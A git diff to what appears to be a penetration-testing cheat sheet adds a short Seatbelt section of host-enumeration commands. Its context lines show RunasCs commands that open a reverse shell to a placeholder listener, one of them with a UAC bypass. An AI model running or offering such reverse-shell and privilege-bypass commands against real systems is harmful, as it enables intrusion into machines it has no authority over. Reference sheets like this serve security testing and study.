@@ -149,6 +149,7 @@ Thank you for reading.
 		- [rpcclient](#rpcclient)
 		- [Rubeus](#rubeus)
 		- [RunasCs](#runascs)
+		- [Seatbelt](#seatbelt)
 		- [smbpasswd](#smbpasswd)
 		- [winexe](#winexe)
 	- [CVE](#cve)
@@ -4715,6 +4716,14 @@ srvinfo
 .\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
 .\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
 .\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
+```
+
+#### Seatbelt
+
+```c
+.\Seatbelt.exe -group=system
+.\Seatbelt.exe -group=all
+.\Seatbelt.exe -group=all -full
 ```
 
 #### smbpasswd
